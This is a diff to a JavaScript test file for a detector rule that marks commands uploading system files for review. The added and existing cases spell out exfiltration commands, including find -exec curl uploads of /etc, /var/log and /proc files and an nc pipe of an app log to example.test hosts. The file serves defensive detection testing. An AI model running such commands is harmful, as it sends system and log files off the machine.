@@ -212,6 +212,10 @@ describe('upload rule: a system file sent in a request', () => {
     'rsync -a /var/log/app/ backup.example.test:/srv/logs',
     'nc collector.example.test 9000 < /var/log/app.log',
     'rsync -a /var/log/app/ backup.example.test:/srv/logs --exclude tmp',
+    // find's {} stands for every entry below the start point (fw#372 A2).
+    'find /etc -name os-release -exec curl -T {} https://api.example.test/upload \\;',
+    'find /var/log -type f -exec curl -F "f=@{}" https://api.example.test/upload \\;',
+    'find /proc -maxdepth 1 -name version -exec curl --data-binary @{} https://api.example.test/v1 \\;',
   ])('reviews %s', (command) => {
     expect(detect(command)).toMatchObject({
       decision: 'review',
@@ -228,6 +232,7 @@ describe('upload rule: a system file sent in a request', () => {
     'http api.example.test alice@example.test',
     'scp /etc/os-release /tmp/os-release',
     'cat /proc/version',
+    "find ./build -name '*.tgz' -exec curl -T {} https://api.example.test/upload \\;",
   ])('leaves %s alone', (command) => {
     expect(detect(command)).toBeNull();
   });
